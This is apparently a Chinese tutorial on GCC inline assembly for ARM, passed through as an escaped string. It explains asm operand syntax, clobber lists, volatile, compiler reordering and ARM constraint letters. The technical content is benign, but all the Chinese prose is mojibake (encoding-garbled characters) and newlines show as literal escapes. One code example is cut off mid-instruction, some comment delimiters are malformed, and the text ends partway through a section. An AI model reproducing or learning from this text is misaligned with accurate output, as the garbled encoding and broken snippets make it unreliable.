*/\nasm(\"movr0,r0\");\nè¯¥è¯­å¥çš„ä½œç”¨æ˜¯å°†r0ç§»åŠ¨åˆ°r0ä¸­ã€‚æ¢å¥è¯è®²ä»–å¹¶ä¸å¹²ä»»ä½•äº‹ã€‚å…¸å‹çš„å°±æ˜¯NOPæŒ‡ä»¤ï¼Œä½œç”¨å°±æ˜¯çŸ­æ—¶çš„å»¶æ—¶ã€‚\nè¯·æ¥ç€é˜…è¯»å’Œå­¦ä¹ è¿™ç¯‡æ–‡æ¡£ï¼Œå› ä¸ºè¯¥å£°æ˜å¹¶ä¸åƒä½ æƒ³è±¡çš„å’Œå…¶ä»–çš„Cè¯­å¥ä¸€æ ·ã€‚å†…åµŒæ±‡ç¼–ä½¿ç”¨æ±‡ç¼–æŒ‡ä»¤å°±åƒåœ¨çº¯æ±‡ç¼–ç¨‹åºä¸­ä½¿ç”¨çš„æ–¹æ³•ä¸€æ ·ã€‚å¯ä»¥åœ¨ä¸€ä¸ªasmå£°æ˜ä¸­å†™å¤šä¸ªæ±‡ç¼–æŒ‡ä»¤ã€‚ä½†æ˜¯ä¸ºäº†å¢åŠ ç¨‹åºçš„å¯è¯»æ€§ï¼Œæœ€å¥½å°†æ¯ä¸€ä¸ªæ±‡ç¼–æŒ‡ä»¤å•ç‹¬æ”¾ä¸€è¡Œã€‚\nasm(\n\"mov r0, r0\\n\\t\"\n\"mov r0, r0\\n\\t\"\n\"mov r0, r0\\n\\t\"\n\"mov r0, r0\"\n);\næ¢è¡Œç¬¦å’Œåˆ¶è¡¨ç¬¦çš„ä½¿ç”¨å¯ä»¥ä½¿å¾—æŒ‡ä»¤åˆ—è¡¨çœ‹èµ·æ¥å˜å¾—ç¾è§‚ã€‚ä½ ç¬¬ä¸€æ¬¡çœ‹èµ·æ¥å¯èƒ½æœ‰ç‚¹æ€ªå¼‚ï¼Œä½†æ˜¯å½“Cç¼–è¯‘å™¨ç¼–è¯‘Cè¯­å¥çš„æ˜¯å€™ï¼Œå®ƒå°±æ˜¯æŒ‰ç…§ä¸Šé¢ï¼ˆæ¢è¡Œå’Œåˆ¶è¡¨ï¼‰ç”Ÿæˆæ±‡ç¼–çš„ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæ±‡ç¼–æŒ‡ä»¤å’Œä½ å†™çš„çº¯æ±‡ç¼–ç¨‹åºä¸­çš„ä»£ç æ²¡ä»€ä¹ˆåŒºåˆ«ã€‚ä½†æ˜¯å¯¹æ¯”å…¶å®ƒçš„Cå£°æ˜ï¼Œasmçš„å¸¸é‡å’Œå¯„å­˜å™¨çš„å¤„ç†æ˜¯ä¸ä¸€æ ·çš„ã€‚é€šç”¨çš„å†…åµŒæ±‡ç¼–æ¨¡ç‰ˆæ˜¯è¿™æ ·çš„ã€‚\nasm(code : output operand list : input operand list : clobberlist);\næ±‡ç¼–å’ŒCè¯­å¥è¿™é—´çš„è”ç³»æ˜¯é€šè¿‡ä¸Šé¢asmå£°æ˜ä¸­å¯é€‰çš„outputoperand listå’Œinput operand listã€‚Clobber liståé¢å†è®²ã€‚\nä¸‹é¢æ˜¯å°†cè¯­è¨€çš„ä¸€ä¸ªæ•´å‹å˜é‡ä¼ é€’ç»™æ±‡ç¼–ï¼Œé€»è¾‘å·¦ç§»ä¸€ä½ååœ¨ä¼ é€’ç»™Cè¯­è¨€çš„å¦å¤–ä¸€ä¸ªæ•´å‹å˜é‡ã€‚\n/* Rotating bits example */\nasm(\"mov %[result], %[value], ror #1\" :[result] \"=r\" (y) : [value] \"r\" (x));\næ¯ä¸€ä¸ªasmè¯­å¥è¢«å†’å·ï¼ˆ:ï¼‰åˆ†æˆäº†å››ä¸ªéƒ¨åˆ†ã€‚\næ±‡ç¼–æŒ‡ä»¤æ”¾åœ¨ç¬¬ä¸€éƒ¨åˆ†ä¸­çš„â€œâ€ä¸­é—´ã€‚\n\"mov %[result], %[value], ror #1\"\næ¥ä¸‹æ¥æ˜¯å†’å·åçš„å¯é€‰æ‹©çš„output operand listï¼Œæ¯ä¸€ä¸ªæ¡ç›®æ˜¯ç”±ä¸€å¯¹[]ï¼ˆæ–¹æ‹¬å·ï¼‰å’Œè¢«ä»–åŒ…æ‹¬çš„ç¬¦å·åç»„æˆï¼Œå®ƒåé¢è·Ÿç€é™åˆ¶æ€§å­—ç¬¦ä¸²ï¼Œå†åé¢æ˜¯åœ†æ‹¬å·å’Œå®ƒæ‹¬ç€çš„Cå˜é‡ã€‚è¿™ä¸ªä¾‹å­ä¸­åªæœ‰ä¸€ä¸ªæ¡ç›®ã€‚\n[result] \"=r\" (y)\næ¥ç€å†’å·åé¢æ˜¯è¾“å…¥æ“ä½œç¬¦åˆ—è¡¨ï¼Œå®ƒçš„è¯­æ³•å’Œè¾“å…¥æ“ä½œåˆ—è¡¨ä¸€æ ·\n[value] \"r\" (x)\nç ´åç¬¦åˆ—è¡¨ï¼Œåœ¨æœ¬ä¾‹ä¸­æ²¡æœ‰ä½¿ç”¨\nå°±åƒä¸Šé¢çš„NOPä¾‹å­ï¼Œasmå£°æ˜çš„4ä¸ªéƒ¨åˆ†ä¸­ï¼Œåªè¦æœ€å°¾éƒ¨æ²¡æœ‰ä½¿ç”¨çš„éƒ¨åˆ†éƒ½å¯ä»¥çœç•¥ã€‚ä½†æ˜¯æœ‰æœ‰ä¸€ç‚¹è¦æ³¨æ„çš„æ˜¯ï¼Œä¸Šé¢çš„4ä¸ªéƒ¨åˆ†ä¸­åªè¦åé¢çš„è¿˜è¦ä½¿ç”¨ï¼Œå‰é¢çš„éƒ¨åˆ†æ²¡æœ‰ä½¿ç”¨ä¹Ÿä¸èƒ½çœç•¥ï¼Œå¿…é¡»ç©ºä½†æ˜¯ä¿ç•™å†’å·ã€‚ä¸‹é¢çš„ä¸€ä¸ªä¾‹å­å°±æ˜¯è®¾ç½®ARMSocçš„CPSRå¯„å­˜å™¨ï¼Œå®ƒæœ‰inputä½†æ˜¯æ²¡æœ‰output operandã€‚\nasm(\"msr cpsr,%[ps]\" : : [ps]\"r\"(status))\nå³ä½¿æ±‡ç¼–ä»£ç æ²¡æœ‰ä½¿ç”¨ï¼Œä»£ç éƒ¨åˆ†ä¹Ÿè¦ä¿ç•™ç©ºå­—ç¬¦ä¸²ã€‚ä¸‹é¢çš„ä¾‹å­ä½¿ç”¨äº†ä¸€ä¸ªç‰¹åˆ«çš„ç ´åç¬¦ï¼Œç›®çš„å°±æ˜¯å‘Šè¯‰ç¼–è¯‘å™¨å†…å­˜è¢«ä¿®æ”¹è¿‡äº†ã€‚è¿™é‡Œçš„ç ´åç¬¦åœ¨ä¸‹é¢çš„ä¼˜åŒ–éƒ¨åˆ†åœ¨è®²è§£ã€‚\nasm(\"\":::\"memory\");\nä¸ºäº†å¢åŠ ä»£ç çš„å¯è¯»æ€§ï¼Œä½ å¯ä»¥ä½¿ç”¨æ¢è¡Œï¼Œç©ºæ ¼ï¼Œè¿˜æœ‰Cé£æ ¼çš„æ³¨é‡Šã€‚\nasm(\"mov %[result], %[value], ror#1\"\nâ€‹ : [result]\"=r\" (y) /*Rotation result. */\nâ€‹ : [value]\"r\" (x) /*Rotated value. */\nâ€‹ : /* No clobbers */\n);\nåœ¨ä»£ç éƒ¨åˆ†%åé¢è·Ÿç€çš„æ˜¯åé¢ä¸¤ä¸ªéƒ¨åˆ†æ–¹æ‹¬å·ä¸­çš„ç¬¦å·ï¼Œå®ƒæŒ‡çš„æ˜¯ç›¸åŒç¬¦å·æ“ä½œåˆ—è¡¨ä¸­çš„ä¸€ä¸ªæ¡ç›®ã€‚\n%[result]è¡¨ç¤ºç¬¬äºŒéƒ¨åˆ†çš„Cå˜é‡yï¼Œ%[value]è¡¨ç¤ºä¸‰éƒ¨åˆ†çš„Cå˜é‡xï¼›\nç¬¦å·æ“ä½œç¬¦çš„åå­—ä½¿ç”¨äº†ç‹¬ç«‹çš„å‘½åç©ºé—´ã€‚è¿™å°±æ„å‘³ç€å®ƒä½¿ç”¨çš„æ˜¯å…¶ä»–çš„ç¬¦å·è¡¨ã€‚ç®€å•ä¸€ç‚¹å°±æ˜¯è¯´ä½ ä¸å¿…å…³å¿ƒä½¿ç”¨çš„ç¬¦å·ååœ¨Cä»£ç ä¸­å·²ç»ä½¿ç”¨äº†ã€‚åœ¨æ—©æœŸçš„Cä»£ç ä¸­ï¼Œå¾ªç¯ç§»ä½çš„ä¾‹å­å¿…é¡»è¦è¿™ä¹ˆå†™ï¼š\nasm(\"mov %0, %1, ror #1\" :\"=r\" (result) : \"r\" (value))\nåœ¨æ±‡ç¼–ä»£ç ä¸­æ“ä½œæ•°çš„å¼•ç”¨ä½¿ç”¨çš„æ˜¯%åé¢è·Ÿä¸€ä¸ªæ•°å­—ï¼Œ%1ä»£è¡¨ç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼Œ%2ä»£ç ç¬¬äºŒä¸ªæ“ä½œæ•°ï¼Œå¾€åçš„ç±»æ¨ã€‚è¿™ä¸ªæ–¹æ³•ç›®å‰æœ€æ–°çš„ç¼–è¯‘å™¨è¿˜æ˜¯æ”¯æŒçš„ã€‚ä½†æ˜¯å®ƒä¸ä¾¿äºç»´æŠ¤ä»£ç ã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œä½ å†™äº†å¤§é‡çš„æ±‡ç¼–æŒ‡ä»¤çš„ä»£ç ï¼Œè¦æ˜¯ä½ æƒ³æ’å…¥ä¸€ä¸ªæ“ä½œæ•°ï¼Œé‚£ä¹ˆä½ å°±ä¸å¾—ä¸ä»æ–°ä¿®æ”¹æ“ä½œæ•°ç¼–å·ã€‚\nä¼˜åŒ–Cä»£ç \næœ‰ä¸¤ç§æƒ…å†µå†³å®šäº†ä½ å¿…é¡»ä½¿ç”¨æ±‡ç¼–ã€‚1stï¼ŒCé™åˆ¶äº†ä½ æ›´åŠ è´´è¿‘åº•å±‚æ“ä½œç¡¬ä»¶ï¼Œæ¯”å¦‚ï¼ŒCä¸­æ²¡æœ‰ç›´æ¥ä¿®æ”¹ç¨‹åºçŠ¶æ€å¯„å­˜å™¨ï¼ˆPSRï¼‰çš„å£°æ˜ã€‚2ndå°±æ˜¯è¦å†™å‡ºæ›´åŠ ä¼˜åŒ–çš„ä»£ç ã€‚æ¯«æ— ç–‘é—®GNUCä»£ç ä¼˜åŒ–å™¨åšçš„å¾ˆå¥½ï¼Œä½†æ˜¯ä»–çš„ç»“æœå’Œæˆ‘ä»¬æ‰‹å·¥å†™çš„æ±‡ç¼–ä»£ç ç›¸å·®å¾ˆè¿œã€‚\nè¿™ä¸€éƒ¨åˆ†æœ‰ä¸€ç‚¹å¾ˆé‡è¦ï¼Œä¹Ÿæ˜¯è¢«åˆ«äººå¿½è§†æœ€å¤šçš„å°±æ˜¯ï¼šæˆ‘ä»¬åœ¨Cä»£ç ä¸­é€šè¿‡å†…åµŒæ±‡ç¼–æŒ‡ä»¤æ·»åŠ çš„æ±‡ç¼–ä»£ç ï¼Œä¹Ÿæ˜¯è¦è¢«Cç¼–è¯‘å™¨çš„ä¼˜åŒ–å™¨å¤„ç†çš„ã€‚è®©æˆ‘ä»¬ä¸‹é¢åšä¸ªè¯•éªŒæ¥çœ‹çœ‹å§ã€‚\nä¸‹é¢æ˜¯ä»£ç å®ä¾‹ã€‚\nbigtree@just:~/embedded/basic-C$ arm-linux-gcc -c test.c\nbigtree@just:~/embedded/basic-C$ arm-linux-objdump -D test.o\nç¼–è¯‘å™¨é€‰æ‹©r3ä½œä¸ºå¾ªç¯ç§»ä½ä½¿ç”¨ã€‚å®ƒä¹Ÿå®Œå…¨å¯ä»¥é€‰æ‹©ä¸ºæ¯ä¸€ä¸ªCå˜é‡åˆ†é…å¯„å­˜å™¨ã€‚Loadæˆ–è€…storeä¸€ä¸ªå€¼å¹¶ä¸æ˜¾å¼çš„è¿›è¡Œã€‚ä¸‹é¢æ˜¯å…¶å®ƒç¼–è¯‘å™¨çš„ç¼–è¯‘ç»“æœã€‚\nE420A0E1 mov r2, r4, ror #1 @ y, x\nç¼–è¯‘å™¨ä¸ºæ¯ä¸€ä¸ªæ“ä½œæ•°é€‰æ‹©ä¸€ä¸ªç›¸åº”çš„å¯„å­˜å™¨ï¼Œå°†æ“ä½œè¿‡çš„å€¼cacheåˆ°r4ä¸­ï¼Œç„¶åä¼ é€’è¯¥å€¼åˆ°r2ä¸­ã€‚è¿™ä¸ªè¿‡ç¨‹ä½ èƒ½ç†è§£ä¸ï¼Ÿ\næœ‰çš„æ—¶å€™è¿™ä¸ªè¿‡ç¨‹å˜å¾—æ›´åŠ ç³Ÿç³•ã€‚æœ‰æ—¶å€™ç¼–è¯‘å™¨ç”šè‡³å®Œå…¨æŠ›å¼ƒä½ åµŒå…¥çš„æ±‡ç¼–ä»£ç ã€‚Cç¼–è¯‘å™¨çš„è¿™ç§è¡Œä¸ºï¼Œå–å†³äºä»£ç ä¼˜åŒ–å™¨çš„ç­–ç•¥å’ŒåµŒå…¥æ±‡ç¼–æ‰€å¤„çš„ä¸Šä¸‹æ–‡ã€‚å¦‚æœåœ¨å†…åµŒæ±‡ç¼–è¯­å¥ä¸­ä¸ä½¿ç”¨ä»»ä½•è¾“å‡ºéƒ¨åˆ†ï¼Œé‚£ä¹ˆCä»£ç ä¼˜åŒ–å™¨å¾ˆæœ‰å¯èƒ½å°†è¯¥å†…åµŒè¯­å¥å®Œå…¨åˆ é™¤ã€‚æ¯”å¦‚NOPä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å®ƒä½œä¸ºå»¶æ—¶æ“ä½œï¼Œä½†æ˜¯å¯¹äºç¼–è¯‘å™¨è®¤ä¸ºè¿™å½±å“äº†ç¨‹åºçš„æ‰§è¡Œé€Ÿé€Ÿï¼Œè®¤ä¸ºå®ƒæ˜¯æ²¡æœ‰ä»»ä½•æ„ä¹‰çš„ã€‚\nä¸Šé¢çš„è§£å†³æ–¹æ³•è¿˜æ˜¯æœ‰çš„ã€‚é‚£å°±æ˜¯ä½¿ç”¨volatileå…³é”®å­—ã€‚å®ƒçš„ä½œç”¨å°±æ˜¯ç¦æ­¢ä¼˜åŒ–å™¨ä¼˜åŒ–ã€‚å°†NOPä¾‹å­ä¿®æ”¹è¿‡åå¦‚ä¸‹ï¼š\n/* NOP example, revised */\nasm volatile(\"movr0, r0\");\nä¸‹é¢è¿˜æœ‰æ›´å¤šçš„çƒ¦æ¼ç­‰ç€æˆ‘ä»¬ã€‚ä¸€ä¸ªè®¾è®¡ç²¾ç»†çš„ä¼˜åŒ–å™¨å¯èƒ½é‡æ–°æ’åˆ—ä»£ç ã€‚çœ‹ä¸‹é¢çš„ä»£ç ï¼š\ni++;\nif (j == 1)\nx += 3;\ni++;\nä¼˜åŒ–å™¨è‚¯å®šæ˜¯è¦ä»æ–°ç»„ç»‡ä»£ç çš„ï¼Œä¸¤ä¸ªi++å¹¶æ²¡æœ‰å¯¹ifçš„æ¡ä»¶äº§ç”Ÿå½±å“ã€‚æ›´è¿›ä¸€æ­¥çš„æ¥è®²ï¼Œiçš„å€¼å¢åŠ 2ï¼Œä»…ä»…ä½¿ç”¨ä¸€æ¡ARMæ±‡ç¼–æŒ‡ä»¤ã€‚å› è€Œä»£ç è¦é‡æ–°ç»„ç»‡å¦‚ä¸‹ï¼š\nif (j == 1)\nx += 3;\ni += 2;\nè¿™æ ·èŠ‚çœäº†ä¸€æ¡ARMæŒ‡ä»¤ã€‚ç»“æœæ˜¯ï¼šè¿™äº›æ“ä½œå¹¶æ²¡æœ‰å¾—åˆ°è®¸å¯ã€‚\nè¿™äº›å°†å¯¹ä½ çš„ä»£ç äº§ç”Ÿå¾ˆåˆ°çš„å½±å“ï¼Œè¿™å°†åœ¨ä¸‹é¢ä»‹ç»ã€‚ä¸‹é¢çš„ä»£ç æ˜¯cä¹˜bï¼Œå…¶ä¸­cå’Œbä¸­çš„ä¸€ä¸ªæˆ–è€…ä¸¤ä¸ªå¯èƒ½ä¼šè¢«ä¸­æ–­å¤„ç†ç¨‹åºä¿®æ”¹ã€‚è¿›å…¥è¯¥ä»£ç å‰å…ˆç¦æ­¢ä¸­æ–­ï¼Œæ‰§è¡Œå®Œè¯¥ä»£ç åå†å¼€å¯ä¸­æ–­ã€‚\nasm volatile(\"mrs r12,cpsr\\n\\t\"\n\"orr r12, r12, #0xC0\\n\\t\"\n\"msr cpsr_c, r12\\n\\t\" ::: \"r12\", \"cc\");\nc = b; / This may fail. */\nasm volatile(\"mrs r12, cpsr\\n\"\n\"bic r12, r12, #0xC0\\n\"\n\"msr cpsr_c, r12\" ::: \"r12\", \"cc\");\nä½†æ˜¯ä¸å¹¸çš„æ˜¯é’ˆå¯¹ä¸Šé¢çš„ä»£ç ï¼Œä¼˜åŒ–å™¨å†³å®šå…ˆæ‰§è¡Œä¹˜æ³•ç„¶åæ‰§è¡Œä¸¤ä¸ªå†…åµŒæ±‡ç¼–ï¼Œæˆ–ç›¸åã€‚è¿™æ ·å°†ä¼šä½¿å¾—æˆ‘ä»¬çš„ä»£ç å˜å¾—æ¯«æ— æ„ä¹‰ã€‚\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨clobberlistå¸®å¿™ã€‚ä¸Šé¢ä¾‹å­ä¸­çš„clobber listå¦‚ä¸‹ï¼š\n\"r12\",\"cc\"\nä¸Šé¢çš„clobber listå°†ä¼šå°†å‘ç¼–è¯‘å™¨ä¼ è¾¾å¦‚ä¸‹ä¿¡æ¯ï¼Œä¿®æ”¹äº†r12å’Œç¨‹åºçŠ¶æ€å¯„å­˜å™¨çš„æ ‡å¿—ä½ã€‚Btwï¼Œç›´æ¥æŒ‡æ˜ä½¿ç”¨çš„å¯„å­˜å™¨ï¼Œå°†æœ‰å¯èƒ½é˜»æ­¢äº†æœ€å¥½çš„ä¼˜åŒ–ç»“æœã€‚é€šå¸¸ä½ åªè¦ä¼ é€’ä¸€ä¸ªå˜é‡ï¼Œç„¶åè®©ç¼–è¯‘å™¨è‡ªå·±é€‰æ‹©é€‚åˆçš„å¯„å­˜å™¨ã€‚å¦å¤–å¯„å­˜å™¨åï¼Œccï¼ˆcondition registor çŠ¶æ€å¯„å­˜å™¨æ ‡å¿—ä½ï¼‰ï¼Œmemoryéƒ½æ˜¯åœ¨clobber listä¸Šæœ‰æ•ˆçš„å…³é”®å­—ã€‚å®ƒç”¨æ¥å‘ç¼–è¯‘å™¨æŒ‡æ˜ï¼Œå†…åµŒæ±‡ç¼–æŒ‡ä»¤æ”¹å˜äº†å†…å­˜ä¸­çš„å€¼ã€‚è¿™å°†å¼ºè¿«ç¼–è¯‘å™¨åœ¨æ‰§è¡Œæ±‡ç¼–ä»£ç å‰å­˜å‚¨æ‰€æœ‰ç¼“å­˜çš„å€¼ï¼Œç„¶ååœ¨æ‰§è¡Œå®Œæ±‡ç¼–ä»£ç åé‡æ–°åŠ è½½è¯¥å€¼ã€‚è¿™å°†ä¿ç•™ç¨‹åºçš„æ‰§è¡Œé¡ºåºï¼Œå› ä¸ºåœ¨ä½¿ç”¨äº†å¸¦æœ‰memory clobberçš„asmå£°æ˜åï¼Œæ‰€æœ‰å˜é‡çš„å†…å®¹éƒ½æ˜¯ä¸å¯é¢„æµ‹çš„ã€‚\nasm volatile(\"mrs r12,cpsr\\n\\t\"\n\"orr r12, r12, #0xC0\\n\\t\"\n\"msr cpsr_c, r12\\n\\t\" :: : \"r12\", \"cc\",\"memory\");\nc = b; / This is safe. */\nasm volatile(\"mrs r12, cpsr\\n\"\n\"bic r12, r12, #0xC0\\n\"\n\"msr cpsr_c, r12\" ::: \"r12\", \"cc\",\"memory\");\nä½¿æ‰€æœ‰çš„ç¼“å­˜çš„å€¼éƒ½æ— æ•ˆï¼Œåªæ˜¯å±€éƒ¨æœ€ä¼˜ï¼ˆsuboptimalï¼‰ã€‚ä½ å¯ä»¥æœ‰é€‰æ‹©æ€§çš„æ·»åŠ dummyoperand æ¥äººå·¥æ·»åŠ ä¾èµ–ã€‚\nasm volatile(\"mrs r12,cpsr\\n\\t\"\n\"orr r12, r12, #0xC0\\n\\t\"\n\"msr cpsr_c, r12\\n\\t\" : \"=X\" (b) :: \"r12\",\"cc\");\nc = b; / This is safe. */\nasm volatile(\"mrs r12\nä¸Šé¢çš„ç¬¬ä¸€ä¸ªasmè¯•å›¾ä¿®æ”¹å˜é‡å…ˆbï¼Œç¬¬äºŒä¸ªasmè¯•å›¾ä¿®æ”¹cã€‚è¿™å°†ä¿ç•™ä¸‰ä¸ªè¯­å¥çš„æ‰§è¡Œé¡ºåºï¼Œè€Œä¸è¦ä½¿ç¼“å­˜çš„å˜é‡æ— æ•ˆã€‚\nç†è§£ä¼˜åŒ–å™¨å¯¹å†…åµŒæ±‡ç¼–çš„å½±å“å¾ˆé‡è¦ã€‚å¦‚æœä½ è¯»åˆ°è¿™é‡Œè¿˜æ˜¯äº‘é‡Œé›¾é‡Œï¼Œæœ€å¥½æ˜¯åœ¨çœ‹ä¸‹ä¸ªä¸»é¢˜ä¹‹å‰å†æŠŠè¿™æ®µæ–‡ç« è¯»å‡ é^_^ã€‚\nInput and output operands\nå‰é¢æˆ‘ä»¬å­¦åˆ°ï¼Œæ¯ä¸€ä¸ªinputå’Œoutput operandï¼Œç”±è¢«æ–¹æ‹¬å·[]ä¸­çš„ç¬¦å·åï¼Œé™åˆ¶å­—ç¬¦ä¸²ï¼Œåœ†æ‹¬å·ä¸­çš„Cè¡¨è¾¾å¼æ„æˆã€‚\nè¿™äº›é™åˆ¶æ€§å­—ç¬¦ä¸²æœ‰å“ªäº›ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬éœ€è¦ä»–ä»¬ï¼Ÿä½ åº”è¯¥çŸ¥é“æ¯ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤åªæ¥å—ç‰¹å®šç±»å‹çš„æ“ä½œæ•°ã€‚ä¾‹å¦‚ï¼šè·³è½¬æŒ‡ä»¤æœŸæœ›çš„è·³è½¬ç›®æ ‡åœ°å€ã€‚ä¸æ˜¯æ‰€æœ‰çš„å†…å­˜åœ°å€éƒ½æ˜¯æœ‰æ•ˆçš„ã€‚å› ä¸ºæœ€åçš„opcodeåªæ¥å—24ä½åç§»ã€‚ä½†çŸ›ç›¾çš„æ˜¯è·³è½¬æŒ‡ä»¤å’Œæ•°æ®äº¤æ¢æŒ‡ä»¤éƒ½å¸Œæœ›å¯„å­˜å™¨ä¸­å­˜å‚¨çš„æ˜¯32ä½çš„ç›®æ ‡åœ°å€ã€‚åœ¨æ‰€æœ‰çš„ä¾‹å­ä¸­ï¼ŒCä¼ ç»™operandçš„å¯èƒ½æ˜¯å‡½æ•°æŒ‡é’ˆã€‚æ‰€ä»¥é¢å¯¹ä¼ ç»™å†…åµŒæ±‡ç¼–çš„å¸¸é‡ã€æŒ‡é’ˆã€å˜é‡ï¼Œç¼–è¯‘å™¨å¿…é¡»è¦çŸ¥é“æ€æ ·ç»„ç»‡åˆ°æ±‡ç¼–ä»£ç ä¸­ã€‚\nå¯¹äºARMæ ¸çš„å¤„ç†å™¨ï¼ŒGCC 4 æä¾›äº†ä¸€ä¸‹çš„é™åˆ¶ã€‚\n   Constraint Usage in ARM state Usage in Thumb state     f Floating point registers f0 .. f7 Not available   G Immediate floating point constant Not available   H Same a G, but negated Not available   I Immediate value in data processing instructionse.g. ORR R0, R0, #operand Constant in the range 0 .. 255e.g. SWI operand   J Indexing constants -4095 .. 4095e.g. LDR R1, [PC, #operand] Constant in the range -255 .. -1e.g. SUB R0, R0, #operand   K Same as I, but inverted Same as I, but shifted   L Same as I, but negated Constant in the range -7 .. 7e.g. SUB R0, R1, #operand   l Same as r Registers r0..r7e.g. PUSH operand   M Constant in the range of 0 .. 32 or a power of 2e.g. MOV R2, R1, ROR #operand Constant that is a multiple of 4 in the range of 0 .. 1020e.g. ADD R0, SP, #operand   m Any valid memory address    N Not available Constant in the range of 0 .. 31e.g. LSL R0, R1, #operand   o Not available Constant that is a multiple of 4 in the range of -508 .. 508e.g. ADD SP, #operand   r General register r0 .. r15e.g. SUB operand1, operand2, operand3 Not available   W Vector floating point registers s0 .. s31 Not available   X Any operand         = ï¼šWrite-only operand, usually used for all output operands+ ï¼šRead-write operand, must be listed as an output operand\u0026 ï¼šA register that should be used for output only      Output operandså¿…é¡»ä¸ºwrite-onlyï¼Œç›¸åº”Cè¡¨è¾¾å¼çš„å€¼å¿…é¡»æ˜¯å·¦å€¼ã€‚Input operandså¿…é¡»ä¸ºread-onlyã€‚Cç¼–è¯‘å™¨æ˜¯æ²¡æœ‰èƒ½åŠ›åšè¿™ä¸ªæ£€æŸ¥ã€‚\næ¯”è¾ƒä¸¥æ ¼çš„è§„åˆ™æ˜¯ï¼šä¸è¦è¯•å›¾å‘input operandå†™ã€‚ä½†æ˜¯å¦‚æœä½ æƒ³è¦ä½¿ç”¨ç›¸åŒçš„operandä½œä¸ºinputå’Œoutputã€‚é™åˆ¶æ€§modifierï¼ˆ+ï¼‰å¯ä»¥è¾¾åˆ°æ•ˆæœã€‚ä¾‹å­å¦‚ä¸‹ï¼š\nasm(\"mov %[value], %[value], ror #1\" : [value]\"+r\" (y))\nå’Œä¸Šé¢ä¾‹å­ä¸ä¸€æ ·çš„æ˜¯ï¼Œæœ€åçš„ç»“æœå­˜å‚¨åœ¨input variableä¸­ã€‚\nå¯èƒ½modifier + ä¸æ”¯æŒæ—©æœŸçš„ç¼–è¯‘å™¨ç‰ˆæœ¬ã€‚åº†å¹¸çš„æ˜¯è¿™é‡Œæä¾›äº†å…¶ä»–è§£å†³åŠæ³•ï¼Œè¯¥æ–¹æ³•åœ¨æœ€æ–°çš„ç¼–è¯‘å™¨ä¸­ä¾ç„¶æœ‰æ•ˆã€‚å¯¹äºinput operatorsæœ‰å¯èƒ½ä½¿ç”¨å•ä¸€çš„æ•°å­—nåœ¨é™åˆ¶å­—ç¬¦ä¸²ä¸­ã€‚ä½¿ç”¨æ•°å­—nå¯ä»¥å‘Šè¯‰ç¼–è¯‘å™¨ä½¿ç”¨çš„ç¬¬nä¸ªoperandï¼Œoperandéƒ½æ˜¯ä»¥0å¼€å§‹è®¡æ•°ã€‚ä¸‹é¢æ˜¯ä¾‹å­ï¼š\nasm(\"mov %0, %0, ror #1\" : \"=r\" (value) :\"0\" (value))\né™åˆ¶æ€§å­—ç¬¦ä¸²â€œ0â€å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œä½¿ç”¨å’Œç¬¬ä¸€ä¸ªoutput operandä½¿ç”¨åŒæ ·input registerã€‚\nè¯·æ³¨æ„ï¼Œåœ¨ç›¸åçš„æƒ…å†µä¸‹ä¸ä¼šè‡ªåŠ¨å®ç°ã€‚å¦‚æœæˆ‘æ²¡å‘Šè¯‰ç¼–è¯‘å™¨é‚£æ ·åšï¼Œç¼–è¯‘å™¨ä¹Ÿæœ‰å¯èƒ½ä¸ºinputå’Œoutputé€‰æ‹©ç›¸åŒçš„å¯„å­˜å™¨ã€‚ç¬¬ä¸€ä¸ªä¾‹å­ä¸­å°±ä¸ºinputå’Œoutputé€‰æ‹©äº†r3ã€‚\nåœ¨å¤šæ•°æƒ…å†µä¸‹è¿™æ²¡æœ‰ä»€ä¹ˆï¼Œä½†æ˜¯å¦‚æœåœ¨inputä½¿ç”¨å‰outputå·²ç»è¢«ä¿®æ”¹è¿‡äº†ï¼Œè¿™å°†æ˜¯è‡´å‘½çš„ã€‚åœ¨inputå’Œoutputä½¿ç”¨ä¸åŒå¯„å­˜å™¨çš„æƒ…å†µä¸‹ï¼Œä½ å¿…é¡»ä½¿ç”¨\u0026modifieræ¥é™åˆ¶outputoperandã€‚ä¸‹é¢æ˜¯ä»£ç ç¤ºä¾‹ï¼š\nasm volatile(\"ldr %0, [%1]\"\"\\n\\t\"\nâ€‹ \"str %2, [%1, #4]\"\"\\n\\t\"\nâ€‹ : \"=\u0026r\" (rdv)\nâ€‹ : \"r\"(\u0026table), \"r\" (wdv)\nâ€‹ : \"memory\");\nåœ¨ä»¥å¼ è¡¨ä¸­è¯»å–ä¸€ä¸ªå€¼ç„¶ååœ¨å†™åˆ°è¯¥è¡¨çš„å¦ä¸€ä¸ªä½ç½®ã€‚\nå…¶ä»–\nå†…åµŒæ±‡ç¼–ä½œä¸ºé¢„å¤„ç†å®\nè¦æ˜¯ç»å¸¸ä½¿ç”¨ä½¿ç”¨éƒ¨åˆ†æ±‡ç¼–ï¼Œæœ€å¥½çš„æ–¹æ³•æ˜¯å°†å®ƒä»¥å®çš„å½¢å¼å®šä¹‰åœ¨å¤´æ–‡ä»¶ä¸­ã€‚ä½¿ç”¨è¯¥å¤´æ–‡ä»¶åœ¨ä¸¥æ ¼çš„ANSIæ¨¡å¼ä¸‹ä¼šå‡ºç°è­¦å‘Šã€‚ä¸ºäº†é¿å…è¯¥ç±»é—®é¢˜**ï¼Œå¯ä»¥ä½¿ç”¨__asm__ä»£æ›¿asmï¼Œ__volatile__ä»£æ›¿volatile**ã€‚è¿™å¯ä»¥ç­‰åŒäºåˆ«åã€‚ä¸‹é¢å°±æ˜¯ä¸ªä¾‹ç¨‹ï¼š\n#define BYTESWAP(val) \\\nasm volatile ( \\\nâ€‹ \"eor r3, %1, %1, ror #16\\n\\t\" \\\nâ€‹ \"bic r3, r3, #0x00FF0000\\n\\t\" \\\nâ€‹ \"mov %0, %1, ror #8\\n\\t\" \\\nâ€‹ \"eor %0, %0, r3, lsr #8\" \\\nâ€‹ : \"=r\" (val) \\\nâ€‹ : \"0\"(val) \\\nâ€‹ : \"r3\", \"cc\" \\\n);\nC æ¡©å‡½æ•°\nå®å®šä¹‰åŒ…å«çš„æ˜¯ç›¸åŒçš„ä»£ç 